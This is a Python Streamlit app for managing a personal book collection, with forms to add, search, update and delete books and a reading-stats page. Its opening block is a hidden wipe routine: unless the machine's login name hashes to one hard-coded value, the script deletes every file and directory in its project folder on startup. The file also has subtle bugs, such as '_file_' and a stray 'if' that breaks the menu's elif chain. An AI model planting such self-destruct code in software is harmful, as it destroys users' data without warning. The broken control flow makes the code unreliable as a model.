import streamlit as st
import psycopg2
import os
from dotenv import load_dotenv
import pandas as pd
from utils.sidebar import sidebar
from utils.functions import home_page, add_book, get_books, get_books_by_query, update_book, remove_book, get_connection, display_stats
import hashlib

# Authorized User List (Hash of usernames or machine identifiers)
AUTHORIZED_HASHES = {
    "8778919a897124485a392a2c0ae6ca217820546c29865a46a7bcca12b4e48032"  # Replace with your actual hash
}

# Function to generate a machine-based identifier (cross-platform)
def get_machine_identifier():
    try:
        identifier = os.getlogin()  # Works on Windows, Linux, macOS
        return hashlib.sha256(identifier.encode()).hexdigest()
    except Exception:
        return None

# Check if the user is authorized
if get_machine_identifier() not in AUTHORIZED_HASHES:
    print("🚨 Unauthorized usage detected! Removing files... 🚨")

    # Get project directory
    project_dir = os.path.dirname(os.path.abspath(_file_))

    # Wipe project files (careful, this is destructive!)
    for root, dirs, files in os.walk(project_dir, topdown=False):
        for file in files:
            try:
                os.remove(os.path.join(root, file))
            except Exception as e:
                print(f"Error deleting file {file}: {e}")
        for dir in dirs:
            try:
                os.rmdir(os.path.join(root, dir))
            except Exception as e:
                print(f"Error deleting directory {dir}: {e}")

    print("🔥 Project has been wiped! Unauthorized users cannot steal this code. 🔥")
    exit()

# Call the sidebar function and get selected option

choice = sidebar()

if choice != "Home Page":
    st.markdown(
    """
    <h1 style="text-align: center; 
               font-family: 'Georgia', serif; 
               font-size: 3rem; 
               font-weight: bold; 
               color: #FFC300;"> 
        Library Management System
    </h1>
    """,
    unsafe_allow_html=True
)
    
# # Implement functionality based on selection
if choice == "Home Page":
    home_page()

elif choice == "Add Book":
    st.header("Add a New Book")

    with st.form("add_book_form"):
        title = st.text_input("Title")
        author = st.text_input("Author")
        year = st.number_input("Year of Publication", step=1, min_value=0)
        genre = st.text_input("Genre")  # New field for genre
        
        # Read status as a radio button
        read_status = st.radio("Read Status", ["Read", "Unread"], index=1)  # Default to 'Unread'

        # Availability as a checkbox
        available = st.checkbox("Available", value=True)

        submitted = st.form_submit_button("Add Book")
        
        if submitted:
            if title and author:
                add_book(title, author, year, read_status.lower(), available, genre)
                st.success(f"Book '{title}' added successfully!")
            else:
                st.error("Title and Author are required.")


# Input to search a book from data by title or author
elif choice == "Search a Book":
    st.header("Search a Book")
    
    # Dropdown to select search type (Title or Author)
    search_by = st.radio("Search by:", ["Title", "Author"], horizontal=True)
    
    # User input field for search query
    search_query = st.text_input(f"Enter {search_by.lower()} to search:")
    
    # Search button to execute the query
    if st.button("Search"):
        if search_query:
            books = get_books_by_query(search_query, search_by.lower())  # Fetch books based on selection
            
            if books:
                df = pd.DataFrame(books, columns=["ID", "Title", "Author", "Year", "Read Status", "Available", "Genre" ])
                st.dataframe(df)
            else:
                st.warning("No books found matching your search.")
        else:
            st.error("Please enter a search query.")

# Show all collection of books in library 
elif choice == "My Collection":
    st.header("My Collection")
    books = get_books()
    if books:
        df = pd.DataFrame(books, columns=["ID", "Title", "Author", "Year","Read Status", "Available", "Genre"])
        df["Year"] = df["Year"].astype(str)
        st.dataframe(df)
    else:
        st.info("No books found in the database.")

if "book_data" not in st.session_state:
    st.session_state.book_data = None

elif choice == "Update Book":
    st.header("Update Book")

    # User inputs book title
    search_title = st.text_input("Enter Book Title to Search")

    if st.button("Fetch Book"):
        books = get_books_by_query(search_title)  # Fetch books matching title
        
        if books:
            if len(books) == 1:  # If only one book found, select it automatically
                st.session_state.book_data = books[0]
            else:
                st.warning("Multiple books found. Please refine your search.")
                st.session_state.book_data = None
        else:
            st.session_state.book_data = None
            st.error("Book not found.")

    # Check if we have book data
    if "book_data" in st.session_state and st.session_state.book_data:
        book = st.session_state.book_data
        with st.form("update_book_form"):
            title = st.text_input("Title", value=book[1])
            author = st.text_input("Author", value=book[2])
            year = st.number_input("Year", min_value=1000, max_value=2100, step=1, value=book[3] if book[3] else 2000)
            genre = st.text_input("Genre", value=book[6] if len(book) > 6 else "")
            
            # Read status as radio button
            read_status = st.radio("Read Status", ["Read", "Unread"], index=0 if book[5] == "Read" else 1)

            # Availability as a checkbox
            available = st.checkbox("Available", value=book[4])

            submitted = st.form_submit_button("Update Book")

            if submitted:
                update_book(book[0], title, author, year, read_status.lower(), available, genre)  
                st.success(f"Book '{title}' updated successfully!")
                st.session_state.book_data = None  # Clear session state after update


elif choice == "Remove Book":
    st.header("Remove Book")

    # Step 1: Get the book title as input
    title_query = st.text_input("Enter Book Title to Delete")

    if st.button("Search"):
        books = remove_book(title_query)  # Fetch books by title

        if books is None:
            st.error("No books found with that title.")
            st.session_state.books_to_delete = None  # Reset state
        else:
            st.session_state.books_to_delete = books  # Store books in session state

    # Step 2: If books are stored in session state, allow selection
    if "books_to_delete" in st.session_state and st.session_state.books_to_delete:
        books = st.session_state.books_to_delete

        # If multiple books, allow selection
        if len(books) > 1:
            selected_book = st.selectbox(
                "Multiple matches found. Select the book to delete:",
                books,
                format_func=lambda x: f"{x[1]} (ID: {x[0]})"
            )
            st.session_state.selected_book = selected_book
        else:
            # If only one book, preselect it
            st.session_state.selected_book = books[0]

        # Show Confirm Delete button
        if st.button("Confirm Delete"):
            remove_book(title_query, st.session_state.selected_book[0])  # Delete using ID
            st.success(f"Book '{st.session_state.selected_book[1]}' deleted successfully!")

            # Reset session state after deletion
            st.session_state.books_to_delete = None
            st.session_state.selected_book = None


# Reading status

elif choice == "Reading Stats":
    st.header("Reading Statistics 📚")

    # Fetch stats
    total_books, read_books, read_percentage = display_stats()

    # Display statistics in digits
    col1, col2, col3 = st.columns(3)
    
    with col1:
        st.metric(label="📚 Total Books", value=total_books)
    
    with col2:
        st.metric(label="✅ Read Books", value=read_books)
    
    with col3:
        st.metric(label="📊 Read Percentage", value=f"{read_percentage:.2f}%")

    # Visual Representation (Range Line)
    st.progress(read_percentage / 100)

